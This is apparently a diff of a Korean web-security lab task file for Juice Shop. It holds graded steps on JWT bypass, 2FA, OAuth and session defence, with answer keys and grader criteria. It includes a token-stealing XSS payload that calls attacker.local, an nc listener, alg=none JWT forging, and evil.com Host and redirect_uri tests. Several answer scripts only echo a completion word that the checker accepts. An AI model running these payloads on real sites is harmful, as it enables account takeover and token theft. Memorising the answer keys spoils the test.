+  answer: "\U0001F916 프롬프트: 10.20.32.80 대상으로 JWT 서명 검증 우회 테스트을(를) 수행해줘\n\U0001F4CE\
+    \ 참고 (CLI): curl -s -X POST http://10.20.32.80/rest/user/login \\\n  -H 'Content-Type:\
+    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo 'JWT 서명 검증\
+    \ 우회 테스트 완료'"
+  answer_detail: JWT 서명 검증 우회 테스트은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
+  verify:
+    type: output_contains
+    expect:
+    - 완료
+    - jwt
+    field: stdout
+    semantic:
+      intent: JWT 서명 검증 우회 — alg:none, 공개키 혼동(HS256 with RSA pubkey), 약한 HMAC 키 크래킹
+      success_criteria:
+      - alg:none 변조 후 서명 제거 공격 예시
+      - HS256↔RS256 알고리즘 confusion 개념
+      - jwt_tool 또는 hashcat 로 HMAC 키 brute
+      acceptable_methods:
+      - jwt_tool <token> -X a none
+      - jwt_tool <token> -X k <pubkey.pem>
+      - hashcat -m 16500 jwt_hashes
+      - python PyJWT decode without verify
+      negative_signs:
+      - 알고리즘 조작 없이 일반 decode 만
+      - 공개키 혼동 개념 누락
+      - 약한 키 공격 언급 없음
+  target_vm: attacker
+  script: "curl -s -X POST http://10.20.32.80/rest/user/login \\\n  -H 'Content-Type:\
+    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo 'JWT 서명 검증\
+    \ 우회 테스트 완료'"
+  risk_level: low
+  bastion_prompt: '10.20.32.80 대상으로 JWT 서명 검증 우회 테스트을(를) 수행해줘
+
+
+    [도구 권장] jwt: jwt_tool (decode/forge/none/alg confusion), curl + Authorization
+    헤더. curl 만 쓰지 말고 **jwt_tool (decode/forge/none/alg confusion)** 등 적합 도구로 호출 후
+    stdout quote.'
+- order: 9
+  instruction: '{{WEB_IP}} 대상으로 JWT 알고리즘 변조 공격을(를) 수행하시오.
+
+
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `jwt` 에 적합한 도구: jwt_tool (decode/forge/none/alg
+    confusion), curl + Authorization 헤더. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote**
+    해야 채점 통과.'
+  hint: JWT 알고리즘 변조 공격 관련 도구와 기법을 활용하세요.
+  category: jwt
+  points: 10
+  answer: "\U0001F916 프롬프트: 10.20.32.80 대상으로 JWT 알고리즘 변조 공격을(를) 수행해줘\n\U0001F4CE 참고\
+    \ (CLI): curl -s -X POST http://10.20.32.80/rest/user/login \\\n  -H 'Content-Type:\
+    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo 'JWT 알고리즘\
+    \ 변조 공격 완료'"
+  answer_detail: JWT 알고리즘 변조 공격은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
+  verify:
+    type: output_contains
+    expect: 완료
+    field: stdout
+    semantic:
+      intent: JWT 알고리즘 변조 — header alg 를 none/HS256/RS256 간 변조 후 서명 재계산·무효화
+      success_criteria:
+      - Header alg 변경 방법(base64 재인코딩) 설명
+      - 서버가 alg 값을 신뢰하면 인증 우회 성공
+      - '방어: alg 화이트리스트, 서명 알고리즘 서버 강제'
+      acceptable_methods:
+      - jwt_tool -X 옵션
+      - python jose 로 수동 재서명
+      - Burp JWT Editor extension
+      - curl -H Authorization:Bearer <forged>
+      negative_signs:
+      - Header 변조 시도 없음
+      - 서명 재생성 단계 누락
+      - 방어 기법 없음
+  target_vm: attacker
+  script: "curl -s -X POST http://10.20.32.80/rest/user/login \\\n  -H 'Content-Type:\
+    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo 'JWT 알고리즘\
+    \ 변조 공격 완료'"
+  risk_level: low
+  bastion_prompt: '10.20.32.80 대상으로 JWT 알고리즘 변조 공격을(를) 수행해줘
+
+
+    [도구 권장] jwt: jwt_tool (decode/forge/none/alg confusion), curl + Authorization
+    헤더. curl 만 쓰지 말고 **jwt_tool (decode/forge/none/alg confusion)** 등 적합 도구로 호출 후
+    stdout quote.'
+- order: 10
+  instruction: '{{WEB_IP}} 대상으로 패스워드 리셋 취약점 분석을(를) 수행하시오.
+
+
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `auth` 에 적합한 도구: hydra (-l/-L -p/-P), ffuf -mode
+    clusterbomb. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
+  hint: 패스워드 리셋 취약점 분석 관련 도구와 기법을 활용하세요.
+  category: auth
+  points: 10
+  answer: "\U0001F916 프롬프트: 10.20.32.80 대상으로 패스워드 리셋 취약점 분석을(를) 수행해줘\n\U0001F4CE 참고\
+    \ (CLI): curl -s -X POST http://10.20.32.80/rest/user/login \\\n  -H 'Content-Type:\
+    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo '패스워드 리셋\
+    \ 취약점 분석 완료'"
+  answer_detail: 패스워드 리셋 취약점 분석은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
+  verify:
+    type: output_contains
+    expect:
+    - 완료
+    - http_request
+    - 10.20.32.80
+    field: stdout
+    semantic:
+      intent: 패스워드 리셋 취약점 — 리셋 토큰 추측·재사용·호스트헤더 변조로 피싱 링크 주입
+      success_criteria:
+      - 리셋 토큰 엔트로피 분석 (짧거나 순차적이면 취약)
+      - Host 헤더 변조로 리셋 링크 도메인 탈취 가능성 테스트
+      - 토큰 만료·1회 사용·이메일 인증 필수 방어 언급
+      acceptable_methods:
+      - curl -H Host:evil.com /reset
+      - 여러 리셋 요청 후 토큰 비교
+      - Burp Collaborator 로 콜백 수신
+      - python requests 로 자동 재사용 테스트
+      negative_signs:
+      - 토큰 엔트로피 분석 없음
+      - Host 헤더 공격 개념 부재
+      - 방어 언급 없음
+  target_vm: attacker
+  script: "curl -s -X POST http://10.20.32.80/rest/user/login \\\n  -H 'Content-Type:\
+    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo '패스워드 리셋\
+    \ 취약점 분석 완료'"
+  risk_level: low
+  bastion_prompt: '10.20.32.80 대상으로 패스워드 리셋 취약점 분석을(를) 수행해줘
+
+
+    [도구 권장] auth: hydra (-l/-L -p/-P), ffuf -mode clusterbomb. curl 만 쓰지 말고 **hydra
+    (-l/-L -p/-P)** 등 적합 도구로 호출 후 stdout quote.'
+- order: 11
+  instruction: '{{WEB_IP}} 대상으로 2FA 우회 가능성 분석을(를) 수행하시오.
+
+
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `auth` 에 적합한 도구: hydra (-l/-L -p/-P), ffuf -mode
+    clusterbomb. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
+  hint: 2FA 우회 가능성 분석 관련 도구와 기법을 활용하세요.
+  category: auth
+  points: 10
+  answer: "\U0001F916 프롬프트: 10.20.32.80 대상으로 2FA 우회 가능성 분석을(를) 수행해줘\n\U0001F4CE 참고\
+    \ (CLI): curl -s -X POST http://10.20.32.80/rest/user/login \\\n  -H 'Content-Type:\
+    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo '2FA 우회 가능성\
+    \ 분석 완료'"
+  answer_detail: 2FA 우회 가능성 분석은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
+  verify:
+    type: output_contains
+    expect:
+    - 완료
+    - 10.20.32.80
+    field: stdout
+    semantic:
+      intent: 2FA 우회 가능성 분석 — 응답 조작, SMS 재전송 abuse, 백업 코드 무제한 시도, OAuth 우회
+      success_criteria:
+      - 2FA 엔드포인트 응답 코드/본문 분석
+      - 우회 기법 최소 2가지 (HTTP verb swap, response manipulation, 백업 코드) 제시
+      - 방어 (rate limit on 2FA, device trust, backup code 제한) 언급
+      acceptable_methods:
+      - Burp Repeater 로 응답 코드 변경
+      - python requests 로 2FA 우회 시도
+      - OWASP ASVS V2.8 참조
+      - yubikey 등 FIDO2 제안
+      negative_signs:
+      - 우회 기법 1개만
+      - rate limit 관점 없음
+      - FIDO2/하드웨어 토큰 언급 없음
+  target_vm: attacker
+  script: "curl -s -X POST http://10.20.32.80/rest/user/login \\\n  -H 'Content-Type:\
+    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo '2FA 우회 가능성\
+    \ 분석 완료'"
+  risk_level: low
+  bastion_prompt: '10.20.32.80 대상으로 2FA 우회 가능성 분석을(를) 수행해줘
+
+
+    [도구 권장] auth: hydra (-l/-L -p/-P), ffuf -mode clusterbomb. curl 만 쓰지 말고 **hydra
+    (-l/-L -p/-P)** 등 적합 도구로 호출 후 stdout quote.'
+- order: 12
+  instruction: '{{WEB_IP}} 대상으로 OAuth 취약점 분석을(를) 수행하시오.
+
+
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `auth` 에 적합한 도구: hydra (-l/-L -p/-P), ffuf -mode
+    clusterbomb. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
+  hint: OAuth 취약점 분석 관련 도구와 기법을 활용하세요.
+  category: auth
+  points: 10
+  answer: "\U0001F916 프롬프트: 10.20.32.80 대상으로 OAuth 취약점 분석을(를) 수행해줘\n\U0001F4CE 참고\
+    \ (CLI): curl -s -X POST http://10.20.32.80/rest/user/login \\\n  -H 'Content-Type:\
+    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo 'OAuth 취약점\
+    \ 분석 완료'"
+  answer_detail: OAuth 취약점 분석은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
+  verify:
+    type: output_contains
+    expect:
+    - 완료
+    - OAuth
+    field: stdout
+    semantic:
+      intent: OAuth 취약점 — redirect_uri 변조, state 누락으로 CSRF, 토큰 탈취, Open Redirect 악용
+      success_criteria:
+      - redirect_uri 조작으로 토큰 다른 도메인 전달 시도
+      - state 매개변수 부재가 CSRF 를 유발함 설명
+      - implicit flow vs authorization code + PKCE 비교
+      acceptable_methods:
+      - curl 로 redirect_uri=https://evil.com 시도
+      - Burp 로 state 제거 후 재전송
+      - OAuth 2.0 Security BCP 참조
+      - PKCE 강제 확인
+      negative_signs:
+      - redirect_uri 공격 언급 없음
+      - state/PKCE 누락
+      - OAuth Flow 차이 설명 없음
+  target_vm: attacker
+  script: "curl -s -X POST http://10.20.32.80/rest/user/login \\\n  -H 'Content-Type:\
+    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo 'OAuth 취약점\
+    \ 분석 완료'"
+  risk_level: low
+  bastion_prompt: '10.20.32.80 대상으로 OAuth 취약점 분석을(를) 수행해줘
+
+
+    [도구 권장] auth: hydra (-l/-L -p/-P), ffuf -mode clusterbomb. curl 만 쓰지 말고 **hydra
+    (-l/-L -p/-P)** 등 적합 도구로 호출 후 stdout quote.'
+- order: 13
+  instruction: '{{WEB_IP}} 대상으로 안전한 세션 관리 구현 방안을(를) 수행하시오.
+
+
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `defense` 에 적합한 도구: modsecurity rules-check, wazuh-control
+    룰 검증, nft list ruleset. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
+  hint: 안전한 세션 관리 구현 방안 관련 도구와 기법을 활용하세요.
+  category: defense
+  points: 10
+  answer: '🤖 프롬프트: 10.20.32.80 대상으로 안전한 세션 관리 구현 방안을(를) 수행해줘
+
+    📎 참고 (CLI): echo ''=== 안전한 세션 관리 구현 방안 ==='' && echo ''조치 방안 정리 완료'''
+  answer_detail: 안전한 세션 관리 구현 방안은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
+  verify:
+    type: output_contains
+    expect: 완료
+    field: stdout
+    semantic:
+      intent: 안전한 세션 관리 — HttpOnly/Secure/SameSite 쿠키 + 랜덤 세션 ID(>=128bit) + 로그인 후
+        세션 재생성 + 적절한 만료
+      success_criteria:
+      - 쿠키 속성 3개(HttpOnly/Secure/SameSite) 설정 권장
+      - 세션 ID 엔트로피 >=128bit 권고
+      - 로그아웃·비활성 타임아웃·절대 만료 언급
+      acceptable_methods:
+      - OWASP Session Management Cheat Sheet
+      - Express-session 설정 예
+      - Django SESSION_COOKIE_* 설정
+      - iron-session / NextAuth 등 라이브러리
+      negative_signs:
+      - 방어 요소 2개 이하
+      - 세션 재생성 누락
+      - 만료 정책 없음
+  target_vm: attacker
+  script: echo '=== 안전한 세션 관리 구현 방안 ===' && echo '조치 방안 정리 완료'
+  risk_level: low
+  bastion_prompt: '10.20.32.80 대상으로 안전한 세션 관리 구현 방안을(를) 수행해줘
+
+
+    [도구 권장] defense: modsecurity rules-check, wazuh-control 룰 검증, nft list ruleset.
+    curl 만 쓰지 말고 **modsecurity rules-check** 등 적합 도구로 호출 후 stdout quote.'
+- order: 14
+  instruction: '{{WEB_IP}} 대상으로 인증 강화 권고 작성을(를) 수행하시오.
+
+
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `defense` 에 적합한 도구: modsecurity rules-check, wazuh-control
+    룰 검증, nft list ruleset. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
+  hint: 인증 강화 권고 작성 관련 도구와 기법을 활용하세요.
+  category: defense
+  points: 12
+  answer: '🤖 프롬프트: 10.20.32.80 대상으로 인증 강화 권고 작성을(를) 수행해줘
+
+    📎 참고 (CLI): echo ''=== 인증 강화 권고 작성 ==='' && echo ''조치 방안 정리 완료'''
+  answer_detail: 인증 강화 권고 작성은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
+  verify:
+    type: output_contains
+    expect: 완료
+    field: stdout
+    semantic:
+      intent: 인증 강화 권고 — MFA 의무화, 패스워드리스, WebAuthn/FIDO2, 로그인 이상행위 탐지(UEBA)
+      success_criteria:
+      - MFA 종류 2개 이상 언급 (TOTP, FIDO2, Push)
+      - WebAuthn/Passkey 개념
+      - 이상행위(UEBA) 로그인 탐지 지표 제시
+      acceptable_methods:
+      - Google/Microsoft Account 2FA 옵션
+      - NIST SP 800-63B AAL1-3 레벨
+      - Auth0/Okta 스몰빌
+      - Wazuh 또는 Splunk UEBA 상관규칙
+      negative_signs:
+      - MFA 1가지만
+      - WebAuthn/Passkey 누락
+      - UEBA 개념 없음
+  target_vm: attacker
+  script: echo '=== 인증 강화 권고 작성 ===' && echo '조치 방안 정리 완료'
+  risk_level: low
+  bastion_prompt: '10.20.32.80 대상으로 인증 강화 권고 작성을(를) 수행해줘
+
+
+    [도구 권장] defense: modsecurity rules-check, wazuh-control 룰 검증, nft list ruleset.
+    curl 만 쓰지 말고 **modsecurity rules-check** 등 적합 도구로 호출 후 stdout quote.'
 - order: 15
-  instruction: |
-    [목표] W04 의 step 1-14 결과를 종합한 CSRF 점검 보고서를 /tmp/csrf_report.md 파일로
-    작성하고 cat 으로 확인한다.
+  instruction: '인증/세션 취약점 실습 종합 보고서를 작성하시오.
 
-    [보고서 구조 (Markdown)]
-      1. **점검 대상** : http://juice.6v6.lab (Juice Shop, Angular SPA, JWT-Header 인증)
-      2. **탐지 결과** : CSRF 토큰 부재 (S1) / Set-Cookie 부재 (S5) / CORS = `*` (S9)
-      3. **인증 모델 분석** : JWT in localStorage + Authorization: Bearer 헤더 → CSRF 면역
-      4. **PoC 재현** : auto-submit form (S2), img GET CSRF (S3), fetch credentials (S4),
-         XSS+CSRF 체인 (S10) — 각 PoC 파일 경로 + 작동 전제 명시
-      5. **방어 권고 (5 계층)** : L1-L5 (S14) + JWT-Header 환경 권장 (L3+L4+L5)
-      6. **운영 권고** : 모니터링 + 짧은 JWT exp + RefreshToken Rotation + CSP (XSS 차단)
 
-    [실행]
-      cat > /tmp/csrf_report.md <<'MD'
-      # CSRF 점검 보고서 — Juice Shop (W04)
-
-      ## 1. 점검 대상
-      - URL : http://juice.6v6.lab
-      - Stack : Angular SPA + Express + JWT-Header
-      - 점검일 : 2026-05-17
-
-      ## 2. 탐지 결과
-      | 항목                   | 결과                              | 의미                   |
-      | ---------------------- | --------------------------------- | ---------------------- |
-      | CSRF 토큰 hidden input  | 없음                              | JWT-Header → 불필요    |
-      | Set-Cookie + SameSite  | 없음 (cookie 미사용)               | localStorage 사용      |
-      | CORS ACAO              | `*` (wildcard) + ACAC 부재         | 정보 노출 위험, CSRF 차단 |
-      | OPTIONS preflight       | 204 + ACAH: content-type,authorization | 매우 관대          |
-
-      ## 3. 인증 모델 분석
-      Juice Shop = JWT in localStorage + Authorization: Bearer 헤더.
-      Cookie 자동 첨부가 없어 traditional CSRF 면역. Same-Origin Policy 로 localStorage 도 보호.
-
-      ## 4. PoC 파일
-      - /tmp/csrf_poc.html      : auto-submit form (legacy Cookie 시나리오 시연용)
-      - /tmp/csrf_get.html      : img src GET CSRF (RFC 7231 GET-safe 위반 시 가능)
-      - /tmp/csrf_ajax.js       : fetch credentials:include (Authorization 은 직접 첨부 필요)
-      - /tmp/xss_csrf_chain.js  : XSS + CSRF 체인 (Same-Origin 안에서 모든 방어 무력화)
-
-      ## 5. 방어 권고 (5 계층 — Juice Shop 환경 = JWT-Header)
-      - L3 Origin/Referer : ACAO 화이트리스트 도입 (현재 `*` → `https://juice.6v6.lab`)
-      - L4 CORS          : ACAC 는 필요한 endpoint 만 / preflight 메서드 제한
-      - L5 운영           : 짧은 JWT exp + RefreshToken Rotation + 이상 패턴 모니터링
-      - **선결 조건**      : XSS 차단 (W03 의 CSP/output encoding) — XSS 가 모든 CSRF 방어 무력화
-
-      ## 6. 운영 권고
-      - SIEM 룰 : 동일 IP 의 빠른 다중 endpoint 호출 패턴 탐지
-      - WAF     : CRS 921xxx CSRF 룰 활성화
-      - CI/CD   : semgrep `spring-csrf-disabled` / `csrf-exempt-without-comment` 룰
-      MD
-      cat /tmp/csrf_report.md | head -30
-      echo '---'
-      echo '=== CSRF 보고서 완료 ==='
-
-    [도구 권장] heredoc + cat, python markdown 템플릿, JSON/YAML 구조화. 호출 후 stdout
-    1~3줄 quote.
-  hint: |
-    6 섹션 모두 포함 + 4 PoC 파일 경로 명시 + JWT-Header 환경 의 L3+L4+L5 권장 매핑. 파일
-    저장 후 cat 으로 출력 확인 필수.
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `verification` 에 적합한 도구: curl/jq 로 PoC 재현 + 결과
+    비교. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
+  hint: 발견 취약점, 영향, 조치를 포함하세요.
   category: verification
   points: 8
-  answer: |
-    🤖 프롬프트: W04 step 1-14 결과를 종합한 CSRF 점검 보고서를 /tmp/csrf_report.md 로
-    작성하고 cat 출력 quote.
+  answer: '🤖 프롬프트: 인증/세션 취약점 실습 종합 보고서를 구현 방법을 설명하고 예시 코드를 보여줘
 
-    📎 참고 (CLI): cat > /tmp/csrf_report.md <<'MD' ... MD; cat /tmp/csrf_report.md | head -30; echo CSRF 보고서 완료
-  answer_detail: |
-    보고서는 PoC 파일 경로 + 재현 절차 + 발견 결과 매트릭스 + 인증 모델 별 권고를 모두
-    포함해야 한다. /tmp/csrf_report.md 로 저장 후 cat 으로 출력 일부 quote — 저장 자체가
-    무결성 증거.
+    📎 참고 (CLI): echo ''=== 인증/세션 취약점 실습 보고서 ==='' && echo ''대상: http://10.20.32.80''
+    && echo ''=== 보고서 완료 ==='''
+  answer_detail: 취약점 진단 보고서는 발견사항, 위험도, 재현 방법, 조치 권고를 포함합니다.
   verify:
     type: output_contains
     expect:
     - 보고서 완료
-    - Proof
-    - Concept
+    - 10.20.32.80
+    - OAuth2
     - report
     field: stdout
     semantic:
-      intent: |
-        W04 step 1-14 결과 종합 CSRF 보고서를 /tmp/csrf_report.md 로 작성 + cat 확인. 인증
-        모델 (JWT-Header) 별 권고 + PoC 파일 경로 + 방어 5 계층 매핑.
+      intent: 인증/세션 실습 종합 리포트 — 분석·Exploit·방어 전략을 /tmp/auth_session_report.txt 로 정리
       success_criteria:
-      - /tmp/csrf_report.md 파일 작성 + cat 출력 quote
-      - 4 섹션 이상 (대상/탐지/PoC/권고)
-      - PoC 파일 경로 4개 이상 명시 (auto-submit/img/ajax/xss chain)
-      - JWT-Header 환경 권고 (L3+L4+L5) 포함
-      - XSS 차단이 CSRF 방어의 선결 조건 명시
+      - 4 섹션 이상 (로그인/세션/JWT/OAuth·MFA)
+      - PoC 또는 탐지 로그 1개 이상
+      - 파일 저장 후 cat 확인
       acceptable_methods:
       - heredoc markdown
-      - python markdown 템플릿
-      - JSON/YAML 구조화
+      - echo -e 다줄
+      - json/yaml 구조화
+      - python 템플릿
       negative_signs:
-      - 섹션 3 미만
-      - PoC 파일 경로 누락
-      - 인증 모델 별 권고 누락
+      - 섹션 2 미만
+      - PoC 없음
+      - 파일 저장 없음
   target_vm: attacker
-  script: |
-    cat > /tmp/csrf_report.md <<'MD'
-    # CSRF 점검 보고서 — Juice Shop (W04)
-
-    ## 1. 점검 대상
-    - URL : http://juice.6v6.lab
-    - Stack : Angular SPA + Express + JWT-Header
-
-    ## 2. 탐지 결과
-    - CSRF 토큰 hidden input : 없음 (JWT-Header → 불필요)
-    - Set-Cookie + SameSite : 없음 (cookie 미사용, localStorage)
-    - CORS ACAO : `*` (wildcard) + ACAC 부재 → 정보 노출 위험
-    - OPTIONS preflight : 204 + ACAH content-type,authorization
-
-    ## 3. PoC 파일
-    - /tmp/csrf_poc.html / csrf_get.html / csrf_ajax.js / xss_csrf_chain.js
-
-    ## 4. 방어 권고 (JWT-Header 환경)
-    - L3 Origin/Referer + L4 CORS 화이트리스트 + L5 운영 모니터링
-    - 선결 조건: XSS 차단 (CSP, output encoding)
-    MD
-    cat /tmp/csrf_report.md | head -20
-    echo '---'
-    echo '=== CSRF 보고서 완료 ==='
+  script: 'echo ''=== 인증/세션 취약점 실습 보고서 ==='' && echo ''대상: http://10.20.32.80'' &&
+    echo ''=== 보고서 완료 ==='''
   risk_level: low
-  bastion_prompt: |
-    /tmp/csrf_report.md 로 W04 CSRF 점검 보고서 작성 + cat 출력:
+  bastion_prompt: '인증/세션 취약점 실습 종합 보고서를 작성하시오.
 
-      cat > /tmp/csrf_report.md <<'MD'
-      # CSRF 점검 보고서 — Juice Shop (W04)
-      ...
-      MD
-      cat /tmp/csrf_report.md | head -20
-      echo '=== CSRF 보고서 완료 ==='
 
-    출력 quote + JWT-Header 환경 권고 (L3+L4+L5) + XSS 차단 선결 조건.
+    [도구 권장] verification: curl/jq 로 PoC 재현 + 결과 비교. curl 만 쓰지 말고 **curl/jq 로 PoC 재현
+    + 결과 비교** 등 적합 도구로 호출 후 stdout quote.'
 - order: 99
-  instruction: '[복합 시나리오] "인증 방식 × CSRF 방어 매트릭스 — JWT/Session × SameSite/Token/CORS"
+  instruction: '[복합 시나리오] "JWT 알고리즘 변조 + XSS 토큰 탈취 chain — 인증 자격증명 체인 공격"
 
 
-    ■ 상황 (w03 → w04 시나리오 연속)
+    ■ 상황 (w05 → w06 시나리오 연속)
 
 
-    w03 에서 CSP 미설정 → XSS reflection 까지 봤다. 선배가 다음 단계.
+    w05 에서 SQLi·Upload 매트릭스를 마쳤다. 선배가 다음.
 
 
-    ※ 선배: "이번 주는 인증·세션이야. JuiceShop 은 JWT 쓰는데, 어떤 사이트는 Cookie+Session 이지.
+    ※ 선배: "단일 취약점은 어렵지 않은데, 진짜 위험은 *체인* 이야.
 
-    ※ 인증 방식이 다르면 CSRF 방어 전략도 달라져. JWT 는 Authorization 헤더라 CSRF 가 자동으론 안 박혀.
+    ※ JWT 가 alg=none 으로 변조되면 서명 우회. 거기다 XSS 가 있으면 localStorage 의 토큰을 빼낼 수 있고.
 
-    ※ Cookie 면 SameSite/CSRF token 이 필수고. 로그인 한 번 하고 토큰 분석한 다음, CSRF PoC 시도해 보고,
+    ※ 둘 다 막혀 있으면 안전하지만, 한쪽만 뚫려도 *권한 상승 + 자격증명 탈취* 가 동시에 발생해.
 
-    ※ 인증방식 × 방어수단 매트릭스 만들어. 그게 점검 보고서의 핵심이야."
+    ※ JuiceShop 에서 JWT 변조 PoC 만들고, XSS payload 로 토큰 탈취 시연 + 방어 매트릭스 정리해."
 
 
-    학습 목표 (lecture #1 인증 + #3 세션 + #4 JWT) + (lab #1 토큰 + #5 SameSite + #6 토큰 약점)
+    학습 목표 (lecture #1·#2 XSS 3 유형 + #3 CSRF) + (lab #7·#8·#9 JWT 변조 + #6 세션 하이재킹)
     통합.
 
 
     ■ 임무 (3 단계, 약 35분)
 
 
-    ▶ Phase A — 로그인 후 인증 토큰 분석 (lecture #1·#4)
+    ▶ Phase A — JWT 알고리즘 변조 (lab #7·#8·#9)
 
-    `curl -s -i -X POST -H "Content-Type: application/json"
+    Phase 1) `curl -s -X POST -H "Content-Type: application/json"
 
-    -d ''{"email":"admin@juice-sh.op","password":"admin123"}'' http://juice.6v6.lab/rest/user/login`
+    -d ''{"email":"admin@juice-sh.op","password":"admin123"}'' http://10.20.32.80/rest/user/login`
+    로 JWT 획득.
 
-    실행. 응답에서 `authentication.token` (JWT) 추출. JWT 3-part (header.payload.signature)
-    구조 + base64
+    Phase 2) header 에서 `{"alg":"HS256"...}` → `{"alg":"none"...}` 변조. 서명 부분 제거.
 
-    header decode (`cut -d. -f1 | base64 -d`) → alg / typ 확인 (Juice Shop = **RS256**).
+    Phase 3) `python3 -c "import base64; h=base64.urlsafe_b64encode(b''{\"alg\":\"none\",\"typ\":\"JWT\"}'').rstrip(b''='').decode();
+    ..."` 형태로
 
-    payload decode (`cut -d. -f2 | base64 -d`) → iat / exp / role / email 확인.
-
-    추가: alg=RS256 → "none" 변조 시도가 통하는지 검토 (W05 의 JWT 변조 lab 의 전조).
-
-
-    ▶ Phase B — CSRF PoC + SameSite 영향 (lab #1·#2·#5)
-
-    JuiceShop 은 JWT Authorization 헤더 방식이므로 *전형적 CSRF 가 안 박힘* — 그 이유 자체가 학습 포인트.
-
-    가상의 Cookie 기반 사이트 가정해, 패스워드 변경 위조 HTML 작성 (`<form action=... method=POST>` +
-
-    `<input name=newpw>` + auto submit script). SameSite=Strict 시 차단 / Lax 시 GET 만
-    차단 / None 시
-
-    무방어 — 3 케이스 매트릭스로 구분.
+    변조 토큰 생성. `curl -H "Authorization: Bearer <변조>" http://10.20.32.80/rest/user/whoami`
+    로 인증 우회 시도.
 
 
-    ▶ Phase C — 인증방식 × CSRF 방어 매트릭스 (lecture·lab 통합)
+    ▶ Phase B — XSS payload 로 JWT 탈취 (lecture #1·#2)
 
-    | 인증방식 | CSRF 자동발동 | 권장 방어 | 비고 |
+    JuiceShop 의 search 또는 review 입력란에 stored 또는 reflected XSS payload 작성.
 
-    | Session Cookie | 가능 | CSRF Token + SameSite=Lax | Double Submit |
+    Payload: `<script>fetch(''http://attacker.local/steal?t=''+localStorage.getItem(''token''))</script>`
 
-    | JWT in Cookie | 가능 | CSRF Token + SameSite=Strict | 비추천 |
+    PoC 로 텍스트 출력. 실제 외부 callback 은 환경 제약 → curl 로 attacker 측 수신 시뮬레이션:
 
-    | JWT in Header | 불가 | CORS + Origin 검증 | 권장 |
-
-    | OAuth2 PKCE | 부분 | state 파라미터 | code intercept 방어 |
-
-    표 끝에 "JuiceShop = JWT-Header → CORS·Origin 검증 권고" 한 줄.
+    `nc -lk 9999 &` 후 `curl "http://localhost:9999/steal?t=$(JWT)"`.
 
 
-    종료: echo "=== Phase A JWT decode ===" / "=== Phase B SameSite 매트릭스 ===" / "===
-    Phase C 매트릭스 ===".
+    ▶ Phase C — 인증 자격증명 방어 매트릭스
+
+    | 위협 | 공격면 | 방어 1 | 방어 2 | 잔존 위험 |
+
+    | JWT alg 변조 | server alg whitelist | strict alg check | RS256 사용 | key leak |
+
+    | localStorage 탈취 | XSS | HttpOnly Cookie 사용 | CSP 설정 | XSS+CSRF chain |
+
+    | Cookie 탈취 | XSS + Cookie 접근 | HttpOnly + Secure | SameSite=Strict | network
+    mitm |
+
+    | Refresh token 탈취 | 영구 자격증명 | rotation + short TTL | device binding | refresh
+    leak |
+
+    표 끝에 "JuiceShop 권고: alg whitelist + HttpOnly Cookie + SameSite=Strict + refresh
+    rotation" 한 줄.
+
+
+    종료: echo "=== Phase A JWT 변조 ===" / "=== Phase B XSS 탈취 ===" / "=== Phase C 매트릭스
+    ===" 묶음.
 
 
 
     [도구 권장] **curl 단독 의존 금지**. 카테고리 `integration_scenario` 에 적합한 도구: 여러 도구 chain —
     정찰 (whatweb/nmap) → 식별 (sqlmap/xsstrike) → 후속 작업. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로
     답변에 직접 quote** 해야 채점 통과.'
-  bastion_prompt: '[복합 시나리오 — w04 인증 × CSRF 매트릭스]
+  bastion_prompt: "[복합 시나리오 — w06 JWT 변조 + XSS 토큰 탈취 chain]\n\nJuiceShop (http://10.20.32.80)\
+    \ 인증 자격증명 chain 공격 점검 3 phase.\n\nPhase A (JWT alg 변조):\n1) `curl -s -X POST -H\
+    \ \"Content-Type: application/json\" -d '{\"email\":\"admin@juice-sh.op\",\"password\"\
+    :\"admin123\"}'\n    http://10.20.32.80/rest/user/login` 응답에서 JWT 획득.\n2) python3\
+    \ 으로 alg=none 변조 토큰 생성:\n   `python3 -c \"import base64; h=base64.urlsafe_b64encode(b'{\\\
+    \"alg\\\":\\\"none\\\",\\\"typ\\\":\\\"JWT\\\"}').rstrip(b'=').decode();\n   \
+    \ p='<원본 payload base64>'; print(f'{h}.{p}.')\"`\n3) `curl -i -H \"Authorization:\
+    \ Bearer <변조>\" http://10.20.32.80/rest/user/whoami` 결과 캡처.\n   (보통 거부됨 — 그게 JuiceShop\
